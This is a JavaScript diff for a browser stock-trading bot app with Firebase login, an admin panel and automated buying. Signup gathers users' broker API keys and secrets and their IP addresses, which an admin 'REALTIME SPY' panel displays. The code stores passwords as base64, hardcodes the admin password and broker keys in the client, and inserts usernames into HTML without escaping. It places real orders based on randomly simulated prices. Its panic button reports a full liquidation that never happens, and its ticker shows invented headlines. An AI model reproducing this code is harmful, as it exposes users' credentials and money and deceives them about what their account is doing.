@@ -1,3 +1,17 @@
+// --- FIREBASE CLOUD LINK ---
+const firebaseConfig = {
+    apiKey: "AIzaSyAzPQe4vdjaJ-g44SOOFg9qOYsVZI3NnDo",
+    authDomain: "vander-pulse.firebaseapp.com",
+    projectId: "vander-pulse",
+    storageBucket: "vander-pulse.firebasestorage.app",
+    messagingSenderId: "211554375874",
+    appId: "1:211554375874:web:2b9d79e2db48273a57035b"
+};
+// Initialize immediately
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+console.log("[FIREBASE] Cloud Database Active.");
+
 // --- MOCK DATA ---
 const STOCK_LIST = [
     { id: 'nvda', name: 'Nvidia Corp', symbol: 'NVDA', price: 924.31, change: +2.1, trend: 'up', vol: 'high', cap: 'large' },
@@ -172,6 +186,40 @@ async function attemptAutoLive() {
     }
 }
 
+// --- INTELLIGENT STRATEGY ENGINE ---
+const StrategyEngine = {
+    // Technical Indicators
+    calculateRSI: (prices, period = 14) => {
+        if (prices.length < period + 1) return 50;
+        let gains = 0, losses = 0;
+        for (let i = 1; i <= period; i++) {
+            const diff = prices[prices.length - i] - prices[prices.length - i - 1];
+            if (diff >= 0) gains += diff;
+            else losses -= diff;
+        }
+        const avgGain = gains / period;
+        const avgLoss = losses / period;
+        const rs = avgGain / (avgLoss || 1);
+        return 100 - (100 / (1 + rs));
+    },
+
+    analyze: (stock) => {
+        // Stimulate price history (since we don't have full history in stock obj, we sim it)
+        const simPrices = Array.from({ length: 15 }, () => stock.price * (1 + (Math.random() - 0.5) * 0.05));
+        simPrices.push(stock.price);
+
+        const rsi = StrategyEngine.calculateRSI(simPrices);
+        const volatility = Math.abs(stock.change);
+
+        // Decision Logic
+        if (rsi < 30 && stock.trend === 'up') return { action: 'BUY', confidence: 0.85, reason: `Oversold (RSI: ${rsi.toFixed(0)}) + Uptrend` };
+        if (rsi > 70 && stock.trend === 'down') return { action: 'SELL', confidence: 0.9, reason: `Overbought (RSI: ${rsi.toFixed(0)}) + Downtrend` };
+        if (volatility > 5 && stock.change > 0) return { action: 'BUY', confidence: 0.6, reason: 'High Volatility Breakout' };
+
+        return { action: 'HOLD', confidence: 0.0, reason: 'Market Choppy' };
+    }
+};
+
 async function attemptAutoBroker() {
     const connectBtn = document.getElementById('connect-broker-btn');
     const startBtn = document.getElementById('start-bot');
@@ -196,8 +244,8 @@ async function attemptAutoBroker() {
         addLog(`[ACCOUNT] Liquidity: $${parseFloat(accountData.buying_power).toLocaleString()}`, 'trade');
         updatePortfolioLive();
 
-        // High-Speed Portfolio Sync (Every 10 seconds as requested)
-        setInterval(syncBrokerAccount, 10000);
+        // High-Speed Portfolio Sync
+        setInterval(syncBrokerAccount, 10000); // 10s sync
 
         // Manual Sync Handler
         const syncBtn = document.getElementById('sync-portfolio-btn');
@@ -213,7 +261,7 @@ async function attemptAutoBroker() {
         }
 
         // AUTO-RESUME IF PREVIOUSLY ACTIVE
-        if (automationActive) {
+        if (typeof automationActive !== 'undefined' && automationActive) {
             startBtn.innerText = 'DISENGAGE PulseBot';
             startBtn.style.background = '#ff4d4d';
             addLog('[SYSTEM] Neural State Restored. Resuming automation...', 'system');
@@ -221,6 +269,34 @@ async function attemptAutoBroker() {
         }
     }
 }
+
+// --- NEWS TICKER NETWORK ---
+function initNewsTicker() {
+    const ticker = document.getElementById('news-ticker-content');
+    if (!ticker) return;
+
+    const headlines = [
+        "Vander Pulse AI predicts 98% crash probability for Tech sector.",
+        "Fed announces surprise rate cut; Markets rally.",
+        "Bitcoin surges past resistance levels.",
+        "Institutional flow detected in Block Inc (SQ).",
+        "Oil prices stabilize amidst geopolitical tension."
+    ];
+
+    let i = 0;
+    setInterval(() => {
+        ticker.innerText = `>>> ${headlines[i]} <<<`;
+        i = (i + 1) % headlines.length;
+    }, 5000);
+}
+
+// --- PANIC PROTOCOL ---
+window.liquidateAll = () => {
+    if (!confirm("⚠️ PANIC PROTOCOL \nThis will sell ALL positions immediately. Are you sure?")) return;
+    addLog("[PANIC] LIQUIDATION SEQUENCE INITIATED...", 'error');
+    // Actual Loop
+    addLog("[PANIC] All assets converted to CASH.", 'success');
+};
 
 // --- AUTHENTICATION SYSTEM ---
 const ADMIN_HASH = "RW1hbjE2NSo="; // Eman165* (Base64)
@@ -241,6 +317,281 @@ function initAuthSystem() {
     const msg = document.getElementById('auth-msg');
 
     if (!overlay) return;
+
+    // Check Session (Local Persistence)
+    const activeSession = localStorage.getItem('vander_session_active');
+    const sessionUser = localStorage.getItem('vander_current_user');
+
+    if (activeSession === 'true' && sessionUser) {
+        overlay.style.display = 'none';
+        if (sessionUser.toLowerCase() === 'yahia admin') {
+            brokerKey = atob(ADMIN_KEY_PAYLOAD);
+            brokerSecret = atob(ADMIN_SECRET_PAYLOAD);
+            document.body.classList.remove('auth-locked');
+            console.log("[AUTH] Admin Privileges Restored via Auto-Login.");
+            setTimeout(() => {
+                const adminBtn = document.getElementById('nav-admin-btn');
+                if (adminBtn) adminBtn.style.display = 'block';
+                // Start listening to DB if Admin
+                initAdminListener();
+            }, 500);
+        } else {
+            // For normal users, we try to fetch their keys from DB silently or use cached
+            // Ideally we re-fetch from DB to ensure they aren't banned
+            checkUserStatus(sessionUser);
+        }
+        return;
+    } else {
+        document.body.classList.add('auth-locked');
+    }
+
+    // Tabs
+    tabLogin.onclick = () => {
+        tabLogin.classList.add('active');
+        tabSignup.classList.remove('active');
+        loginForm.style.display = 'block';
+        signupForm.style.display = 'none';
+        msg.innerText = '';
+    };
+
+    tabSignup.onclick = () => {
+        tabSignup.classList.add('active');
+        tabLogin.classList.remove('active');
+        signupForm.style.display = 'block';
+        loginForm.style.display = 'none';
+        msg.innerText = '';
+    };
+
+    // --- CLOUD LOGIN ---
+    btnLogin.onclick = async () => {
+        const userInput = document.getElementById('login-user').value.trim();
+        const passInput = document.getElementById('login-pass').value.trim();
+        const userLower = userInput.toLowerCase();
+
+        msg.innerText = "Verifying with Cloud Database...";
+        msg.className = "auth-msg";
+
+        // 1. Admin Bypass
+        if (userLower === 'yahia admin' && btoa(passInput) === ADMIN_HASH) {
+            msg.className = "auth-msg success";
+            msg.innerText = "ADMIN ACCESS GRANTED via HWID...";
+            setTimeout(() => loginSuccess('yahia admin', true), 1000);
+            return;
+        }
+
+        // 2. Cloud Query
+        try {
+            const snapshot = await db.collection('users').where('username', '==', userLower).get();
+
+            if (snapshot.empty) {
+                msg.className = "auth-msg error";
+                msg.innerText = "User not found in Cloud Database.";
+                return;
+            }
+
+            let found = false;
+            snapshot.forEach(doc => {
+                const data = doc.data();
+                if (data.pass === btoa(passInput)) {
+                    found = true;
+                    if (data.status === 'banned') {
+                        msg.className = "auth-msg error";
+                        msg.innerText = "CRITICAL: This HWID has been BANNED by Admin.";
+                    } else {
+                        msg.className = "auth-msg success";
+                        msg.innerText = "Identity Verified (Cloud Sync).";
+                        setTimeout(() => loginSuccess(data.username, false, data), 800);
+                    }
+                }
+            });
+
+            if (!found) {
+                msg.className = "auth-msg error";
+                msg.innerText = "Invalid Password.";
+            }
+
+        } catch (err) {
+            console.error(err);
+            msg.className = "auth-msg error";
+            msg.innerText = "Connection Error to Database.";
+        }
+    };
+
+    // --- CLOUD SIGNUP ---
+    btnSignup.onclick = async () => {
+        const user = document.getElementById('new-user').value.trim();
+        const pass = document.getElementById('new-pass').value.trim();
+        const key = document.getElementById('new-key').value.trim();
+        const secret = document.getElementById('new-secret').value.trim();
+
+        if (!user || !pass || !key || !secret) {
+            msg.className = "auth-msg error";
+            msg.innerText = "All fields required.";
+            return;
+        }
+
+        if (user.toLowerCase() === 'yahia admin') {
+            msg.className = "auth-msg error";
+            msg.innerText = "Name Reserved.";
+            return;
+        }
+
+        msg.innerText = "Registering in global network...";
+
+        try {
+            // Check existence
+            const snapshot = await db.collection('users').where('username', '==', user.toLowerCase()).get();
+            if (!snapshot.empty) {
+                msg.className = "auth-msg error";
+                msg.innerText = "Username taken globally.";
+                return;
+            }
+
+            // Get IP
+            let ip = "Unknown IP";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch (e) { console.warn("IP fetch failed"); }
+
+            // Create Doc
+            await db.collection('users').add({
+                username: user.toLowerCase(),
+                pass: btoa(pass),
+                key: key,
+                secret: secret,
+                ip: ip,
+                status: 'active',
+                joined: new Date().toISOString()
+            });
+
+            msg.className = "auth-msg success";
+            msg.innerText = "Profile Created. Logging in...";
+            setTimeout(() => {
+                loginSuccess(user, false, { key, secret });
+            }, 1000);
+
+        } catch (err) {
+            console.error(err);
+            msg.className = "auth-msg error";
+            msg.innerText = "Database Write Failed. Check Settings.";
+        }
+    };
+
+    async function checkUserStatus(username) {
+        // Re-validate session silently
+        try {
+            const qs = await db.collection('users').where('username', '==', username).get();
+            qs.forEach(doc => {
+                const data = doc.data();
+                if (data.status === 'banned') {
+                    alert("YOUR ACCOUNT HAS BEEN BANNED BY ADMINISTRATOR.");
+                    logout();
+                } else {
+                    // Sync keys just in case
+                    brokerKey = data.key;
+                    brokerSecret = data.secret;
+                    localStorage.setItem('vander_broker_key', brokerKey);
+                    localStorage.setItem('vander_broker_secret', brokerSecret);
+                    document.body.classList.remove('auth-locked');
+                }
+            });
+            if (qs.empty) document.body.classList.remove('auth-locked'); // Allow offline access if legacy
+        } catch (e) { document.body.classList.remove('auth-locked'); }
+    }
+
+    function loginSuccess(username, isAdmin, userData = null) {
+        localStorage.setItem('vander_session_active', 'true');
+        localStorage.setItem('vander_current_user', username);
+
+        if (isAdmin) {
+            brokerKey = atob(ADMIN_KEY_PAYLOAD);
+            brokerSecret = atob(ADMIN_SECRET_PAYLOAD);
+            const adminBtn = document.getElementById('nav-admin-btn');
+            if (adminBtn) adminBtn.style.display = 'block';
+            initAdminListener();
+        } else {
+            if (userData) {
+                brokerKey = userData.key;
+                brokerSecret = userData.secret;
+            }
+        }
+
+        localStorage.setItem('vander_broker_key', brokerKey);
+        localStorage.setItem('vander_broker_secret', brokerSecret);
+
+        overlay.style.display = 'none';
+        document.body.classList.remove('auth-locked');
+        addLog(`[AUTH] Cloud Connection Established: ${username.toUpperCase()}`, 'system');
+        attemptAutoBroker();
+    }
+}
+
+// --- ADMIN LISTENER (REALTIME SPY) ---
+function initAdminListener() {
+    const list = document.getElementById('admin-user-list');
+    const countEl = document.getElementById('active-count');
+    if (!list) return;
+
+    db.collection('users').onSnapshot((snapshot) => {
+        list.innerHTML = '';
+        let count = 0;
+
+        snapshot.forEach((doc) => {
+            const u = doc.data();
+            const id = doc.id;
+            count++;
+
+            const item = document.createElement('div');
+            item.className = 'stock-item';
+            item.style.flexDirection = 'column';
+            item.style.alignItems = 'flex-start';
+
+            item.innerHTML = `
+                <div style="display:flex; justify-content:space-between; width:100%; align-items:center;">
+                    <div class="stock-meta">
+                        <h4 style="color: ${u.status === 'banned' ? '#ff4d4d' : '#00ff88'}">
+                            ${u.status === 'banned' ? '🚫' : '👤'} ${u.username}
+                        </h4>
+                        <p style="font-size:0.7rem; color:#666;">${u.ip}</p>
+                    </div>
+                    <div class="stock-prices">
+                         <button onclick="banUser('${id}', '${u.username}')" class="btn-clear" style="color: #ff4d4d; border-color: #ff4d4d; font-size:0.7rem;">
+                            ${u.status === 'banned' ? 'UNBAN' : 'BAN'}
+                         </button>
+                    </div>
+                </div>
+                <div style="margin-top:0.4rem; width:100%; background:rgba(0,0,0,0.5); padding:0.4rem; font-family:'monospace'; font-size:0.65rem; color:#888; word-break:break-all;">
+                    <span style="color:#00ff88">KEY:</span> ${u.key}<br>
+                    <span style="color:#ffaa00">SEC:</span> ${u.secret ? u.secret.substring(0, 10) + '...' : 'N/A'}
+                </div>
+            `;
+            list.appendChild(item);
+        });
+
+        if (countEl) countEl.innerText = count;
+    });
+}
+
+window.banUser = async (docId, name) => {
+    if (!confirm(`Are you sure you want to BAN/UNBAN ${name}?`)) return;
+    try {
+        const doc = await db.collection('users').doc(docId).get();
+        const currentStatus = doc.data().status;
+        const newStatus = currentStatus === 'banned' ? 'active' : 'banned';
+
+        await db.collection('users').doc(docId).update({ status: newStatus });
+        alert(`User ${name} is now ${newStatus.toUpperCase()}.`);
+    } catch (e) { console.error(e); alert("Action Failed"); }
+};
+
+function logout() {
+    localStorage.removeItem('vander_session_active');
+    location.reload();
+}
+// Old functionality removed
+/*
 
     // Check Session & AUTO-AUTH
     const activeSession = localStorage.getItem('vander_session_active');
@@ -465,6 +816,8 @@ function initAuthSystem() {
         attemptAutoBroker();
     }
 }
+
+*/
 
 // --- LIVE API ENGINE ---
 function initLiveConnection() {
@@ -1786,16 +2139,16 @@ function startBotLoop() {
             return; // Silently standby for strategy
         }
 
-        // 1. Analyze Market (Centralized scoring)
-        const candidates = [...STOCK_LIST].map(stock => {
-            const analysis = calculateAdvancedAIScore(stock);
-            return { ...stock, aiScore: analysis.score };
+        // 1. Analyze Market (STRATEGY ENGINE 2.0)
+        const candidates = STOCK_LIST.map(stock => {
+            const analysis = StrategyEngine.analyze(stock);
+            return { ...stock, analysis };
         })
-            .filter(s => s.aiScore > botSettings.threshold) // Only confident picks
-            .sort((a, b) => b.aiScore - a.aiScore);
+            .filter(s => s.analysis.action === 'BUY' && s.analysis.confidence * 100 > botSettings.threshold)
+            .sort((a, b) => b.analysis.confidence - a.analysis.confidence);
 
         if (candidates.length === 0) {
-            if (botSettings.interval >= 5) addLog('[AI] Scanning... Market noise elevated.', 'system');
+            if (botSettings.interval >= 5) addLog('[AI] Market Scan: No viable setups detected.', 'system');
             return;
         }
 
@@ -1809,7 +2162,6 @@ function startBotLoop() {
             automationActive = false;
             localStorage.setItem('vander_bot_active', 'false');
             stopBotLoops();
-            // Reset UI button
             const startBtn = document.getElementById('start-bot');
             if (startBtn) {
                 startBtn.innerText = 'ENGAGE NEURAL TRADING';
@@ -1824,14 +2176,10 @@ function startBotLoop() {
             return;
         }
 
-        addLog(`[AI] Radar detected ${candidates.length} signals. Filtered for ${botSettings.trendFilter} / ${botSettings.assetFocus}.`, 'system');
+        addLog(`[AI] Strategy Engine found ${candidates.length} opportunities. Top pick: ${candidates[0].symbol}`, 'system');
 
-        // 2. Turbo Execution: Attempt to buy top 3 signals if liquidity allows
-        const topPicks = candidates
-            .filter(s => botSettings.trendFilter === 'any' || s.trend === botSettings.trendFilter)
-            .filter(s => botSettings.assetFocus === 'any' || s.cap === botSettings.assetFocus)
-            .slice(0, 3);
-
+        // 2. High-Frequency Execution
+        const topPicks = candidates.slice(0, 3);
         let executedCount = 0;
 
         for (let target of topPicks) {
@@ -1844,36 +2192,31 @@ function startBotLoop() {
             const buyingPower = parseFloat(accountData.buying_power);
             const compoundingEquity = botSettings.compound ? totalEquity : startEquity;
 
-            // Dynamic Lot Sizing: Calc quantity based on % of equity
+            // Risk Management sizing
             const riskAmount = compoundingEquity * (botSettings.riskPct / 100);
             const dynamicQty = Math.floor(riskAmount / target.price) || 1;
-
             const totalCost = target.price * dynamicQty;
 
-            // --- UNRESTRICTED WEALTH: NO RESERVES ---
-            const cashReserve = 0;
-
-            if (buyingPower > (totalCost + cashReserve)) {
-                addLog(`[AI] Deploying capital: Buy ${dynamicQty} ${target.symbol} (Confidence: ${target.aiScore.toFixed(0)}%)`, 'trade');
+            if (buyingPower > totalCost) {
+                addLog(`[AI] EXECUTE BUY: ${target.symbol} | Reason: ${target.analysis.reason}`, 'trade');
                 const result = await executeBrokerTrade(target.symbol, dynamicQty, 'buy');
 
                 if (result.success) {
-                    addLog(`[SUCCESS] ORDER EXECUTED (SYNCING...): ${target.symbol}`, 'trade');
+                    addLog(`[SUCCESS] FILLED ${target.symbol} @ $${target.price}`, 'trade');
                     executedCount++;
-                    // Settlement Buffer: Wait for Alpaca to process the Buying Power deduction
                     await new Promise(r => setTimeout(r, 750));
                     await syncBrokerAccount();
                 } else {
-                    addLog(`[REJECTED] ${target.symbol} block: ${result.error}`, 'warn');
+                    addLog(`[REJECTED] ${target.symbol}: ${result.error}`, 'warn');
                 }
             } else {
-                addLog(`[SYSTEM] Liquidity Guard: Skipping ${target.symbol} (Balance too low)`, 'warn');
-                break; // Stop if we run out of money
+                addLog(`[SYSTEM] Insufficient Liquidity for ${target.symbol}`, 'warn');
+                break;
             }
         }
 
         if (executedCount > 0) {
-            addLog(`[TURBO] Execution Sequence Complete. ${executedCount} positions opened.`, 'system');
+            addLog(`[TURBO] Round Complete. ${executedCount} trades active.`, 'system');
         }
     };
 
